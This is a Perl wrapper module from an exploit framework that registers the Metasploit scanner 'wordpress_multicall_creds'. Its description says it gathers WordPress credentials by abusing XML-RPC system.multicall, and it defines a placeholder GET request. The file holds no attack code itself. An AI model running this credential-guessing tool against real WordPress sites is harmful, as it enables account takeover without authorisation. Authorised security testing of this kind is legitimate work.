package WORDPRESS::MSF::WordpressMulticallCreds;
use lib qw(../../); use parent qw(Exploit);

use 5.10.0;

use strict;
use warnings;

no warnings 'experimental';

use URI::URL;
use Data::Dump qw(dump);
use File::Slurp qw(read_file);

# # 
# # 
# # 

sub load {
    my $type  = shift;
    my $class = ref $type || $type;
    my $self = { };
    bless $self, $class;

    return $self;
}

sub new {
   my $class = shift;
   

   my $name = "WordpressMulticallCreds";

   my $DETECTION = {

   };

my $EXPLOIT = {
  DESCRIPTION => "

        This module attempts to find Wordpress credentials by abusing the XMLRPC

        APIs. Wordpress versions prior to 4.4.1 are suitable for this type of

        technique. For newer versions, the script will drop the CHUNKSIZE to 1 automatically.

      ",
  MSF_MODULE  => "wordpress_multicall_creds",
  REFERENCES  => [
                   "https://blog.cloudflare.com/a-look-at-the-new-wordpress-brute-force-amplification-attack/",
                   "https://blog.sucuri.net/2014/07/new-brute-force-attacks-exploiting-xmlrpc-in-wordpress.html",
                 ],
  TITLE       => "Wordpress XML-RPC system.multicall Credential Collector",


  TYPE => 'MSF',
  PLATFORM => 'SCANNER',
  REQUESTS => {
    EXPLOIT1 => {
      METHOD       => 'GET',
      PATH   => '',
      PAYLOAD      => '',
      TEXT   => 'Sending Exploit #1 Request : [GET] ',
      HEADERS      => {
        'Content-Type' => 'application/x-www-form-urlencoded',
      },
      VALIDATION   => {
        TCODE => ['200'],
      },
    },
  },
   };

   return $class->SUPER::new($name, $DETECTION, $EXPLOIT, @_);
}

return 1;
